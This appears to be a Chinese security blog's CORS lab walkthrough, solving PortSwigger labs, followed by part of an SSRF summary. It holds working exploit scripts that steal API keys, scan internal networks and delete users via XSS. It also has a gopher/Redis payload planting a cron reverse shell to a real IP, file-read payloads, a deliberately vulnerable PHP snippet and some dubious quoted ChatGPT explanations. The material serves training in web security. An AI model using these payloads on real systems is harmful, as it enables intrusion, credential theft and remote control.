HTTP 响应标头 Access-Control-Allow-Origin 始终设置为 null。当用户指定 null 以外的任何值时，应用程序不会处理它并在 HTTP 响应中继续反映 null 。允许攻击者执行漏洞利用的技巧很少，并且可以使用 CORS 请求过滤受害者的数据。**应用程序接受 Origin 标头中指定的 null 值。**![image-20230510220243338](CORS跨域漏洞/image-20230510220243338.png)#### 注意事项如果响应包 Header 中为以下情况 ，则不存在漏洞。```Access-Control-Allow-Origin: *Access-Control-Allow-Credentials:true```![image-20230510220310783](CORS跨域漏洞/image-20230510220310783.png)原因是因为浏览器会对此类情况的请求进行自动拦截，不具备漏洞利用条件。在 CORS-vulnerable-Lab 靶场的 POCs 目录下，有 CORS 漏洞利用的脚本以 `arbitrary_origin_exploit.html` 为例，用文本编辑器打开该脚本文件，找到如下代码并根据实际应用场景进行修改````js&lt;script&gt;//向目标应用程序网页发出 CORS 请求以获取 HTTP 响应的函数function exploit() &#123; var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() &#123;   if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;     var all = this.responseText;     document.getElementById(&quot;load&quot;).innerHTML= all; // 分割打印被盗取的 HTTP 响应           &#125; &#125;; xhttp.open(&quot;GET&quot;, &quot;http://192.168.126.6/CORS/arbitrary_origin.php&quot;, true); //将 URL 更改为错误配置 CORS 策略的 URL xhttp.setRequestHeader(&quot;Accept&quot;, &quot;text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,\\/;q=0.8&quot;); xhttp.setRequestHeader(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;); xhttp.withCredentials = true; xhttp.send();&#125;&lt;/script&gt;\n\n\n将利用脚本放置在搭建的恶意网站下，当受害者在同一浏览器登录目标网站，并打开该恶意链接，即可盗取目标网站的 HTTP 响应内容。\n\n这里我复现不出来…\n0x12 bp官网的靶场练习\n实验一: 具有基本原点反射的 CORS 漏洞\n信息:\n该网站具有不安全的CORS配置，因为它信任所有来源。要解决该实验室问题，请编写一些使用 CORS 检索管理员 API 密钥并将代码上传到漏洞利用服务器的 JavaScript。当您成功提交管理员的 API 密钥时，该实验就解决了。您可以使用以下凭据登录到您自己的帐户：wiener:peter\n首先开启bp代理,同时关闭拦截,记录你浏览网页的请求\n\n登陆账号，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS\n\n接下来我们将其发送到重发器,验证是否有CORS漏洞\n\n如上图我们在请求区添加origin头,并写入随意的一个域名,响应后发现右侧的CORS头出现我们输入的域名(不论我们的域名是什么),这说明的确存在CORS漏洞, 即允许任意源的访问\n接下来我们要编写js脚本,意在向服务器发送获取管理员详细信息的请求(这里是cookie),并将请求得到的数据存放在我们的日志中\nhttps://0ac200c803b3121486c4a98700c50006: 此处换成你实验室的url即可\n&lt;script&gt;    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open(&#x27;get&#x27;,&#x27;https://0ac200c803b3121486c4a98700c50006.web-security-academy.net/accountDetails&#x27;,true);    req.withCredentials = true;    req.send();    function reqListener() &#123;        location=&#x27;/log?key=&#x27;+this.responseText;    &#125;;&lt;/script&gt;\n接着将该脚本添加到漏洞服务器中(发送给受害者),查看你的日志,如下图可以看到成功得到管理员的apikey\n\n\n如上图,从左到右依次点击即可\n实验室二：受信任空源的CORS漏洞\n提示:\n这个网站有一个不安全的CORS配置，因为它信任“null”来源。\n为了解决这个实验，编写一些JavaScript，使用CORS检索管理员的API密钥并将代码上传到漏洞利用服务器。当您成功提交管理员的API密钥时，该实验就解决了.\n您可以使用以下凭据登录到自己的帐户：wiener:peter\n同上题\n登陆账号，单击&quot;我的帐户&quot;，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS\n\n经过实验发现,这次不能允许任意源的访问了,那我们给origin赋值为null看看响应,发现成功响应\n\n接着用iframe构造null源的请求来绕过\n在浏览器中，转到漏洞利用服务器并输入以下HTML（将YOUR-LAB-ID替换为实验室URL的URL，将YOUR-EXPLOIT-SERVER-ID替换为漏洞利用服务器ID）\n&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&lt;script&gt;    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open(&#x27;get&#x27;,&#x27;YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true);    req.withCredentials = true;    req.send();    function reqListener() &#123;        location=&#x27;YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=&#x27;+encodeURIComponent(this.responseText);    &#125;;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; 我的是：&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; srcdoc=&quot;&lt;script&gt;    var req = new XMLHttpRequest();    req.onload = reqListener;    req.open(&#x27;get&#x27;,&#x27;https://0a3100d803693dd6813ff78900520003.web-security-academy.net/accountDetails&#x27;,true);    req.withCredentials = true;    req.send();    function reqListener() &#123;        location=&#x27;https://exploit-0a8900c2034a3d9a8119f65d01ab00f8.exploit-server.net/log?key=&#x27;+encodeURIComponent(this.responseText);    &#125;;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;\t\n注意iframe沙箱的使用，因为这会生成一个空的源请求。\n原因如下：GPT回答\n这里iframe沙箱为何会产生一个空的源请求？//ChatGPT在给定的代码中，使用了一个具有沙箱属性的 &lt;iframe&gt; 元素，它的 sandbox 属性被设置为 &quot;allow-scripts allow-top-navigation allow-forms&quot;。这些属性指定了一组沙箱规则，用于限制嵌入的文档的行为。其中，allow-scripts 属性允许嵌入的文档执行脚本，allow-top-navigation 属性允许嵌入的文档导航到顶级窗口，allow-forms 属性允许嵌入的文档提交表单。**当使用具有沙箱属性的 &lt;iframe&gt; 元素时，如果没有指定 src 属性，则会执行 srcdoc 属性的内容作为内联文档。在这种情况下，内联文档的源被视为一个空字符串。**由于源被视为一个空字符串，因此在发出请求时，浏览器会创建一个空的初始请求，因为没有指定具体的源。这个初始请求不会导致真正的网络请求，也不会发送到服务器。因此，你观察到的是一个空的源请求。需要注意的是，沙箱属性可以提供一定的安全性，但它仍然需要在合适的场景和正确的使用方式下才能发挥作用。开发者应该仔细考虑并评估是否需要使用沙箱以及如何设置沙箱属性，以确保安全性和功能之间的平衡。\n单击&quot;查看漏洞利用&quot;（view）。观察漏洞利用是否有效-已登录到日志页面，API密钥位于URL中（测试poc的可行性，就不在这测了，直接到发给受害者）\n返回到利用漏洞攻击服务器并单击&quot;将利用漏洞攻击发送给受害者&quot;。\n\n\n成功!!!\n实验三:  受信任的不安全协议的CORS漏洞\n提示:\n1、此网站具有不安全的CORS配置，因为它信任所有子域，而不管协议如何。\n2、解决实验：编制JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交api key\n3、已有账号：wiener:peter\n\n如上图,依旧可能存在CORS漏洞,发送到重发器验证\n\n此时将origin标头改为:\nOrigin:http://subdomain.lab-id（lab-id 是实验室域名） 我的是：Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.net\n\n如上图成功发现利用漏洞(发现其任意子域都可以访问)\n组合利用\n打开一个产品页面，单击Check stock并观察它是使用一个子域上的HTTP URL加载的\n\n接下来验证该子域是否存在XSS漏洞,如下图,响应中并没有对我们的恶意代码进行某些必要的编码过滤,因此的确存在XSS漏洞\n\n在浏览器中，转到漏洞利用服务器并输入以下HTML，将YOUR-LAB-ID替换为您的唯一实验室URL，将YOUR-EXPLOIT-SERVER-ID替换为您的漏洞利用服务器ID：\n&lt;script&gt;    document.location=&quot;http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4&lt;script&gt;\tvar req = new XMLHttpRequest(); \treq.onload = reqListener; \treq.open(&#x27;get&#x27;,&#x27;https://YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true); \treq.withCredentials = true;\treq.send();\tfunction reqListener() &#123;        location=&#x27;https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=&#x27;%2bthis.responseText;    &#125;;%3c/script&gt;&amp;storeId=1&quot;&lt;/script&gt; 我的是：&lt;script&gt;    document.location=&quot;http://stock.0a9800610460650c822b3861005c0050.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://0a9800610460650c822b3861005c0050.web-security-academy.net/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://exploit-0a6c00a2045f65df82f537b4017f003e.exploit-server.net/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&amp;storeId=1&quot;&lt;/script&gt;\n\n实验四: CORS漏洞与内部网络枢轴攻击\n提示:\n1、此网站具有不安全的CORS配置，因为它信任所有内部网络来源。\n2、完成实验：编制JavaScript来定位本地网络（192.168.0.0/24，端口8080）上的端点，然后使用该端点来识别和创建基于CORS的攻击以删除用户。删除用户Carlos后，实验将得到解决。\npart1:\n需要扫描本地网络以查找端点。将$collaboratorPayload替换为Collaborator有效负载或漏洞利用服务器URL\n&lt;script&gt;var q = [], collaboratorURL = &#x27;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/&#x27;; for(i=1;i&lt;=255;i++) &#123;\tq.push(function(url) &#123;\t\treturn function(wait) &#123;\t\t\tfetchUrl(url, wait);\t\t&#125;\t&#125;(&#x27;http://192.168.0.&#x27;+i+&#x27;:8080&#x27;));&#125; for(i=1;i&lt;=20;i++)&#123;\tif(q.length)q.shift()(i*100);&#125; function fetchUrl(url, wait) &#123;\tvar controller = new AbortController(), signal = controller.signal;\tfetch(url, &#123;signal&#125;).then(r =&gt; r.text().then(text =&gt; &#123;\t\tlocation = collaboratorURL + &#x27;?ip=&#x27;+url.replace(/^http:\\/\\//,&#x27;&#x27;)+&#x27;&amp;code=&#x27;+encodeURIComponent(text)+&#x27;&amp;&#x27;+Date.now();\t&#125;))\t.catch(e =&gt; &#123;\t\tif(q.length) &#123;\t\t\tq.shift()(wait);\t\t&#125;\t&#125;);\tsetTimeout(x =&gt; &#123;\t\tcontroller.abort();\t\tif(q.length) &#123;\t\t\tq.shift()(wait);\t\t&#125;\t&#125;, wait);&#125;&lt;/script&gt;\n上述代码解析：GPT回答解析：1.定义了一个空数组 q 用于存储异步请求的队列。2.定义了一个 collaboratorURL 变量，指定了协作者的 URL。3.使用一个 for 循环从 1 到 255，生成了一系列函数，并将这些函数添加到队列 q 中。每个生成的函数将调用 fetchUrl(url, wait) 函数，并将不同的 IP 地址组合成一个 URL。4.使用另一个 for 循环从 1 到 20，不断从队列 q 中取出函数，并调用它们，传递不同的等待时间参数。5.定义了一个 fetchUrl(url, wait) 函数，用于发起异步请求。6.创建了一个 AbortController 对象和对应的 signal 信号。7.使用 fetch 函数发送一个 GET 请求到指定的 URL，并指定 signal 作为参数传递给请求选项。8.当请求成功返回时，将响应的文本内容作为参数拼接到指定的协作者 URL，并进行重定向。9.如果请求失败，则判断队列 q 是否还有剩余的函数，如果有，则取出下一个函数并执行。10.使用 setTimeout 设置一个超时定时器，当超时时，终止请求并执行与上述相同的处理逻辑。这段代码的目的是通过循环异步请求来尝试访问本地网络中的 HTTP 服务，并将响应的文本内容发送到协作者的服务器。\n在漏洞利用服务器中输入以下代码。单击存储，然后单击“将漏洞利用发送给受害者”。\n\n检查日志或Collaborator交互组件，并查看发送给它的代码参数\n\n发现: 192.168.0.175:8080\npart2:\n重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为从协作者交互中检索到的IP地址和端口号。不要忘记添加Collaborator有效负载或再次利用服务器URL。更新并提供漏洞利用。\n&lt;script&gt;function xss(url, text, vector) &#123;\tlocation = url + &#x27;/login?time=&#x27;+Date.now()+&#x27;&amp;username=&#x27;+encodeURIComponent(vector)+&#x27;&amp;password=test&amp;csrf=&#x27;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];&#125; function fetchUrl(url, collaboratorURL)&#123;\tfetch(url).then(r =&gt; r.text().then(text =&gt; &#123;\t\txss(url, text, &#x27;&quot;&gt;&lt;img src=&#x27;+collaboratorURL+&#x27;?foundXSS=1&gt;&#x27;);\t&#125;))&#125; fetchUrl(&quot;http://192.168.0.175:8080&quot;, &quot;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/&quot;);&lt;/script&gt;\n代码解析：GPT回答解析：1.定义了一个 xss(url, text, vector) 函数，用于执行 XSS 攻击。2.构造了一个带有恶意 XSS 脚本的 URL，该 URL 包含了目标网站的登录页面地址、时间戳、恶意用户名和密码、以及来自目标网站的 CSRF 令牌。3.将当前页面的 location 设置为构造的恶意 URL，从而实现跳转和注入恶意脚本的目的。4.定义了一个 fetchUrl(url, collaboratorURL) 函数，用于发送异步请求获取目标 URL 的响应内容，并触发 XSS 攻击。5.使用 fetch 函数发送一个 GET 请求到目标 URL，并获取响应的文本内容。6.在响应返回时，将目标 URL、响应文本和恶意向量作为参数传递给 xss 函数，以触发 XSS 攻击。7.调用 fetchUrl 函数，传递目标 URL 和协作者 URL 作为参数，以发起异步请求并触发 XSS 攻击。这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。\n现在我们将探测用户名字段中的XSS漏洞。\n\n检索URL中具有foundXSS=1的Collaborator交互；或者在日志中看到foundXSS=1\n\npart3:\n重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为与步骤2中相同的IP地址和端口号，再次添加Collaborator有效负载或漏洞利用服务器。更新并提供漏洞利用\n&lt;script&gt;function xss(url, text, vector) &#123;\tlocation = url + &#x27;/login?time=&#x27;+Date.now()+&#x27;&amp;username=&#x27;+encodeURIComponent(vector)+&#x27;&amp;password=test&amp;csrf=&#x27;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];&#125; function fetchUrl(url, collaboratorURL)&#123;\tfetch(url).then(r=&gt;r.text().then(text=&gt;\t&#123;\t\txss(url, text, &#x27;&quot;&gt;&lt;iframe src=/admin onload=&quot;new Image().src=\\&#x27;&#x27;+collaboratorURL+&#x27;?code=\\&#x27;+encodeURIComponent(this.contentWindow.document.body.innerHTML)&quot;&gt;&#x27;);\t&#125;\t))&#125; fetchUrl(&quot;http://192.168.0.175:8080&quot;, &quot;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/&quot;);&lt;/script&gt;\n\nCollaborator交互或利用服务器日志会提供管理页面的源代码\n\npart4：\n检索源代码，会注意到有一个允许删除用户的表单。重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为相同的IP地址和端口号。\n//  源代码 &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;            &lt;div id=&quot;academyLabHeader&quot;&gt;    &lt;section class=&quot;academyLabBanner&quot;&gt;        &lt;div class=&quot;container&quot;&gt;            &lt;div class=&quot;logo&quot;&gt;&lt;/div&gt;                &lt;div class=&quot;title-container&quot;&gt;                    &lt;h2&gt;CORS vulnerability with internal network pivot attack&lt;/h2&gt;                    &lt;a id=&quot;exploit-link&quot; class=&quot;button&quot; target=&quot;_blank&quot; href=&quot;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net&quot;&gt;Go to exploit server&lt;/a&gt;                    &lt;a class=&quot;link-back&quot; href=&quot;https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack&quot;&gt;                        Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;description&amp;nbsp;                        &lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; viewBox=&quot;0 0 28 30&quot; enable-background=&quot;new 0 0 28 30&quot; xml:space=&quot;preserve&quot; title=&quot;back-arrow&quot;&gt;                            &lt;g&gt;                                &lt;polygon points=&quot;1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15&quot;&gt;&lt;/polygon&gt;                                &lt;polygon points=&quot;14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15&quot;&gt;&lt;/polygon&gt;                            &lt;/g&gt;                        &lt;/svg&gt;                    &lt;/a&gt;                &lt;/div&gt;                &lt;div class=&quot;widgetcontainer-lab-status is-notsolved&quot;&gt;                    &lt;span&gt;LAB&lt;/span&gt;                    &lt;p&gt;Not solved&lt;/p&gt;                    &lt;span class=&quot;lab-status-icon&quot;&gt;&lt;/span&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/section&gt;&lt;/div&gt;            &lt;div theme=&quot;&quot;&gt;            &lt;section class=&quot;maincontainer&quot;&gt;                &lt;div class=&quot;container is-page&quot;&gt;                    &lt;header class=&quot;navigation-header&quot;&gt;                        &lt;section class=&quot;top-links&quot;&gt;                            &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;                            &lt;a href=&quot;/admin&quot;&gt;Admin panel&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;                            &lt;a href=&quot;/my-account?id=administrator&quot;&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;                        &lt;/section&gt;                    &lt;/header&gt;                    &lt;header class=&quot;notification-header&quot;&gt;                    &lt;/header&gt;                    &lt;form style=&quot;margin-top: 1em&quot; class=&quot;login-form&quot; action=&quot;/admin/delete&quot; method=&quot;POST&quot;&gt;                        &lt;input required=&quot;&quot; type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;Mn2Dj8wVciUoD89vrl36Io4lkfpFQQG0&quot;&gt;                        &lt;label&gt;Username&lt;/label&gt;                        &lt;input required=&quot;&quot; type=&quot;text&quot; name=&quot;username&quot;&gt;                        &lt;button class=&quot;button&quot; type=&quot;submit&quot;&gt;Delete user&lt;/button&gt;                    &lt;/form&gt;                &lt;/div&gt;            &lt;/section&gt;        &lt;/div&gt;     HTTP/1.1&quot; 200 &quot;User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36&quot;\n//  脚本&lt;script&gt;function xss(url, text, vector) &#123;\tlocation = url + &#x27;/login?time=&#x27;+Date.now()+&#x27;&amp;username=&#x27;+encodeURIComponent(vector)+&#x27;&amp;password=test&amp;csrf=&#x27;+text.match(/csrf&quot; value=&quot;([^&quot;]+)&quot;/)[1];&#125; function fetchUrl(url)&#123;\tfetch(url).then(r=&gt;r.text().then(text=&gt;\t&#123;\txss(url, text, &#x27;&quot;&gt;&lt;iframe src=/admin onload=&quot;var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\\&#x27;carlos\\&#x27;,f.submit()&quot;&gt;&#x27;);\t&#125;\t))&#125; fetchUrl(&quot;http://192.168.0.175:8080&quot;);&lt;/script&gt;\n代码解析：GPT回答解析：1.定义了一个 xss(url, text, vector) 函数，用于执行 XSS 攻击。2.构造了一个带有恶意 XSS 脚本的 URL，该 URL 包含了目标网站的登录页面地址、时间戳、恶意用户名和密码、以及来自目标网站的 CSRF 令牌。3.将当前页面的 location 设置为构造的恶意 URL，从而实现跳转和注入恶意脚本的目的。4.定义了一个 fetchUrl(url) 函数，用于发送异步请求获取目标 URL 的响应内容，并触发 XSS 攻击。5.使用 fetch 函数发送一个 GET 请求到目标 URL，并获取响应的文本内容。6.在响应返回时，将目标 URL、响应文本和恶意向量作为参数传递给 xss 函数，以触发 XSS 攻击。7.在构造恶意向量时，使用了一个包含 &lt;iframe&gt; 元素的恶意 XSS 脚本代码。该 &lt;iframe&gt; 元素的 src 属性设置为 /admin，并在加载完成时触发一个 JavaScript 代码，该代码会找到目标页面中的表单，将用户名字段（如果存在）设置为 &#x27;carlos&#x27;，然后自动提交表单。8.调用 fetchUrl 函数，传递目标 URL 作为参数，以发起异步请求并触发 XSS 攻击。这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。\n\n代码通过注入一个指向/admin页面的iframe提交表单以删除carlos\n\n详情参考: https://blog.csdn.net/qq_53079406/article/details/128696923?spm=1001.2014.3001.5502\n","categories":["常见top漏洞"]},{"title":"ssrf漏洞总结","url":"/2023/07/26/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/","content":"ssrf漏洞总结\n一、SSRF是什么？\nSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。\n一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n二、SSRF漏洞原理\nSSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。\n\n比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器\n其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制 导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据数据流:攻击者-----&gt;服务器----&gt;目标地址即：利用一个可以发起网络请求的服务（存在缺陷的web应用），当作跳板来攻击其他服务器。我的理解是攻击者利用一个存在缺陷的web应用（服务器），而该服务器可以访问受害者的服务器，那么攻击者对web应用发起一种请求（要获取受害者服务器内网资源的请求），该web应用由于对该请求没有做出严格的过滤，被认为该请求是安全的，返回受害者服务器的内部资源和数据\n什么是内网访问\ncsdn上看了一篇大佬的文章，感觉挺通俗易懂。我就简单复述一下，加深一下印象。首先需要了解一下公有ip和私有ip公有ip:公有ip是全球唯一的，需要注册才能使用。而且是可以直接上网的。私有ip：私有ip不需要注册，因此，他不能直接上网。我们平时上网一般都是通过网络运营商（移动，联通，电信）。原理就是这些个运营商呀，他们是购买了公有ip的。然后他们分配给我们这些用户，我们使用的就是私有ip，或者叫局域网。这样的话，就会导致你和你周围的邻居们分出来的私有ip可能是一样的。 这样的好处是我们大家都可以方便的上网，当然也有不利之处，那就是两家相同私有ip同时访问百度页面，这个百度的服务器怎么分辨这两家分别是谁呢。这个就要用到另外一个东西：端口映射。\n什么是端口映射\n端口映射是NAT的一种，他将外网IP地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该IP的这个端口时，服务器自动将请求映射到对应局域网的内部机器上，现在市场是的家庭路由器都具备NAT功能，也可以实现端口映射。下图是小米路由器的端口映射设置图：\n对于这个概念，我个人的理解就是外网的ip地址的一个端口与内网的一个端口(或许是直接对应到内网的某个服务器?下面的图更好理解)实现对应。\n我们平时经过路由器，通过宽带，最终去到运营商那边，数据是从运营商出去，最终数据是回到运营商那边，运营商再把数据发送到用户的电脑。\n路由器，至少有两个端口：WAN 口和 LAN 口。\nWAN：接外部 IP 地址用，通常指的是出口，转发来自内部 LAN 接口的 IP 数据包，这个口的 IP 是唯一的。\nLAN：接内部 IP 地址用，LAN 内部是交换机。\n\nA 电脑的 IP 是局域网 IP（192.168.31.11），这个 IP（192.168.31.11）是从路由器的 lan口分配的。\n当我们上百度的时候，经过路由器的 wan口，进行相应的IP、端口转化：192.168.31.11:80 -&gt; 10.221.0.24:8080,所以，从 wan口出去的地址为：10.221.0.24:8080。\n\n最后，经过运营商，运营商那边会做相应的端口映射（而且是动态端口映射），子网 IP（10.221.0.24:8080）转化为公网IP（128.0.0.1:8888），通过这个公网 IP 去访问百度服务器\n\n这位博主贴的图也是非常的形象，上面也有详细的介绍。简单来说，就是左下角和右下角两个ip地址对应的都是用户的私有ip，然后通过LAN将子网进行转换。然后再通过WAN口将子网转为公网。\n三、漏洞挖掘\n危害与利用：\n1、端口扫描\n\n对外网、服务器所在内网、本地进行端口扫描\n\neg：http://example.com/ssrf.php?url=http://192.168.139.1:80/\n\n通过应用响应时间、返回的错误信息，未开放端口会显示空白或者报错，开放端口会显示服务的banner信息\n\n​\n​    2、攻击内网、本地漏洞服务\n​\n​    攻击运行在内网或本地的应用程序（溢出、弱口令等）\n​\n​    利用Gopher协议拓展攻击面\n​\n​    3、内网Web应用指纹识别、攻击漏洞应用\n​\n​    访问默认文件，对内网web应用进行指纹识别（框架，平台，模块以及CMS等 ）\n​\n​    攻击内外网的web应用，主要是使用get参数就可以实现的攻击（如struts2，sqli等）;\n​\n​    第一步，应用指纹识别----&gt;第二步，寻找漏洞-----&gt;第三步，漏洞利用\n​\n​    4、文件读取\n​\n​    读取本地文件，利用file协议读取本地文件，提交参数等\n​\n​    http://example.com/ssrf.php?url=file:///etc/passwd\n1、可以对服务器所在的内网环境进行端口扫描、资源访问2、利用漏洞和Payload进一步攻击运行其他的应用程序;3、对内网web应用进行指纹识别，通过访问应用存在的默认文件实现4、GET型漏洞利用，GET参数就可以实现的攻击，比如struts2漏洞利用等5、POST型漏洞利用，可利用gopher协议进行参数构造;6、利用Redis未授权访问getshell、Weblogic默认SSRF漏洞页面7、如果ssrf漏洞存在于云服务器    攻击元数据服务    攻击存储桶    攻击Kubelet API    越权攻击云平台内其他组件或服务\n漏洞场景：\n1、通过URL地址进行网页分享;http://share.xxx.com/index.php?url=http://www.xxx.com2、转码服务，通过URL地址把原地址的网页转换格式3、图片加载与下载，一般是通过url参数进行图片获取http://image.xxx.com/image.php?image=http://www.xxx.com4、未公开的api实现以及其他调用url的功能;5、设备后台管理进行存活测试;6、远程资源调用功能;7、数据库内置功能;8、编辑器进行远程图片抓取，如: ueditor;9、打包附件或者内容编辑并导出时10、PDF生成或导出11、从URL关键字中寻找利用google 语法加上这些关键字去寻找SSRF漏洞\tshare    wap    url    link    src    source    target    u    display    sourceURl    imageURL    domain\n简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞\n从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）\n利用技巧\n利用条件：被攻击的服务等没有开启加密传输与鉴权。\n端口扫描（扫描内网）\n攻击内网存在漏洞的服务\n攻击Web应用进行指纹识别及其中的漏洞\n如果PHP安装了expect扩展，可以通过expect协议执行系统命令\ndos攻击\nfile 协议暴力枚举敏感文件\n\nRedis未授权漏洞的6种利用方法\n保存文件到www目录，形成webshell\n创建authorized_keys文件，利用ssh 私钥登录服务器\n写计划任务(/var/spool/cron/ &amp; /etc/cron.d/)\nslave of 8.8.8.8 主从模式利用\n写入到/etc/profile.d/ 用户环境变量修改\n开启AOF持久化纯文本记录 appendfilename\n\n存在SSRF漏洞的站点主要利用四个协议，分别是http、file、gopher、dict协议\nfile协议进行本地文件的读取\nhttp协议进行内网的ip扫描、端口探测\n探测到6379端口开放，可以利用http、gopher、dict这几个协议来打开放6379端口的redis服务。\n\n最常见的是通过file、dict、gopher这三个协议来进行渗透。\ncurl -vvv &#x27;dict://127.0.0.1:6379/info&#x27; curl -vvv &#x27;file:///etc/passwd&#x27; # * 注意: 链接使用单引号，避免$变量问题 curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;\n四、产生SSRF漏洞的函数\nSSRF攻击可能存在任何语言编写的应用，接下来将举例php中可能存在SSRF漏洞的函数。\n1、file_get_contents:（只能使用GET方式获取数据）\n下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。\n定义：把整个文件读入一个字符串中语法：file_get_contents(path,include_path,context,start,max_length)参数\t描述path\t必需。要读取的文件\tinclude_path\t可选。要在 include_path 中搜寻文件，将该参数设为 &quot;1&quot;context\t可选。规定文件句柄的环境，context 是一套可以修改流的行为的选项。若使用 null，则忽略。start\t可选。文件中开始读取的位置 (适用于PHP 5.1以后)max_length\t可选。读取的字节数 (适用于PHP 5.1以后)\n&lt;?phpif (isset($_POST[&#x27;url&#x27;])) &#123; $content = file_get_contents($_POST[&#x27;url&#x27;]); $filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; file_put_contents($filename, $content); echo $_POST[&#x27;url&#x27;]; $img = &quot;&lt;img src=\\&quot;&quot;.$filename.&quot;\\&quot;/&gt;&quot;; &#125; echo $img; 